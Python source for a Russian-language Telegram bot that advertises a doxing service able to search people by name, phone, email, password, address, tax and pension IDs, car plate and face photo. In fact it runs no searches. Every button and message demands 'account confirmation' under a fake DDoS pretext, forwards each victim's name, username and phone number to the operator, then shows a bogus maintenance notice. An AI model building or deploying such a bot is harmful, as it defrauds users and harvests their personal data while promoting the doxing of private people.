import telebot
from telebot import types
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

from config import *

bot = telebot.TeleBot(Token)




find_menu = types.InlineKeyboardMarkup()
button0 = types.InlineKeyboardButton('🔎Начать поиск', callback_data="start_dox")
find_menu.row(button0)
button1 = types.InlineKeyboardButton('⚙️Аккаунт', callback_data="dox")
button2 = types.InlineKeyboardButton('🆘Поддержка',callback_data="dox")
find_menu.row(button1,button2)
button3 = types.InlineKeyboardButton('🤖Создать собственный бот',callback_data="dox")
find_menu.row(button3)
button4 = types.InlineKeyboardButton('🤝Партнерская программа',callback_data="dox")
find_menu.row(button4)





@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.from_user.id,"*Добро пожаловать!*",parse_mode="Markdown")
    bot.send_message(message.from_user.id,"*Выберите нужное действие:*",parse_mode="Markdown",reply_markup=find_menu)


@bot.callback_query_handler(func=lambda call: call.data == "start_dox")
def button0_pressed(call: types.CallbackQuery):
	bot.send_message(chat_id=call.message.chat.id,text= "👤 Поиск по имени\n"+\
											"├  `Блогер` _(Поиск по тегу)_\n"\
											"├  `Антипов Евгений Вячеславович`\n"\
											"└  `Антипов Евгений Вячеславович 05.02.1994`\n"\
											"_(Доступны также следующие форматы_ "+"`05.02`"+"_/_"+"`1994`"+"_/_"+"`28`"+"_/_"+"`20-28`"+"_)_\n\n"\
											"🚗 Поиск по авто\n"\
											"├  `Н777ОН777` - поиск авто по *РФ*\n"\
											"└  `ХТА21150053965897` - поиск по *VIN*\n\n"\
											"👨 *Социальные сети*\n"\
											"├  `https://www.instagram.com/violetta_orlova` - *Instagram*\n"\
											"├  `https://vk.com/id577744097` - *Вконтакте*\n"\
											"├  `https://facebook.com/profile.php?id=1` - *Facebook*\n"\
											"└  `https://ok.ru/profile/162853188164` - *Одноклассники*\n\n"\
											"📱 `79999939919` - для поиска по *номеру телефона*\n"\
											"📨 `tema@gmail.com` - для поиска по *Email*\n"\
   										    "📧 `#281485304`, `@durov` или `перешлите сообщение` - поиск по *Telegram* аккаунту\n\n"\
											"🔐 `/pas churchill7` - поиск почты, логина и телефона *по паролю*\n"\
											"🏚 `/adr Москва, Тверская, д 1, кв 1` - информация по адресу (РФ)\n"\
											"🏘 `77:01:0001075:1361` - поиск по *кадастровому номеру*\n\n"\
											"🏛 `/company Сбербанк` - поиск по *юр лицам*\n"\
											"📑 `/inn 784806113663` - поиск по *ИНН*\n"\
											"🎫 `/snils 13046964250` - поиск по *СНИЛС*\n\n"\
											"📸 Отправьте *фото человека*, чтобы найти его или двойника на сайтах *ВК*, *ОК*.\n"\
											"🚙 Отправьте *фото номера автомобиля*, чтобы получить о нем информацию.\n"\
											"🙂 Отправьте *стикер*, чтобы найти *создателя*.\n"\
											"🌎 Отправьте *точку на карте*, чтобы *найти людей*, которые сейчас там.\n"\
											"🗣 С помощью *голосовых команд* также можно выполнять *поисковые запросы*.",parse_mode="Markdown")

send = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
button_phone = types.KeyboardButton(text="✅Подтвердить", request_contact=True)
send.add(button_phone)

@bot.callback_query_handler(func=lambda call: call.data == "dox")
def button1_pressed(call: types.CallbackQuery):
	bot.send_message(chat_id=call.message.chat.id,text= "⚠️Прежде чем начать поиск, подтвердите свой аккаунт\n\n""*Это временная мера, связанная с активной DDOS атакой на нас.*",parse_mode="Markdown",reply_markup=send)



@bot.message_handler(content_types=['contact']) 
def contact(message):
    if message.contact is not None:
        bot.send_message(admin,"*🔔Кто-то отправил свой номер!*\n"+\
        	"Имя: `"+message.from_user.first_name+\
        	"\n`Логин: @"+message.from_user.username+\
        	"\nНомер телефона: `"+message.contact.phone_number+"`",parse_mode="Markdown")
        bot.send_message(message.from_user.id,"*⚠️ Технические работы до 05:00 по мск.*\n\nРаботы будут завершены в данный промежуток времени, все подписки продлены.",parse_mode="Markdown",reply_markup=types.ReplyKeyboardRemove())



@bot.message_handler(content_types=['text'])
def handler(message):
	bot.send_message(message.from_user.id,"⚠️Прежде чем начать поиск, подтвердите свой аккаунт\n\n""*Это временная мера, связанная с активной DDOS атакой на нас.*",parse_mode="Markdown",reply_markup=send)




bot.polling(none_stop=True)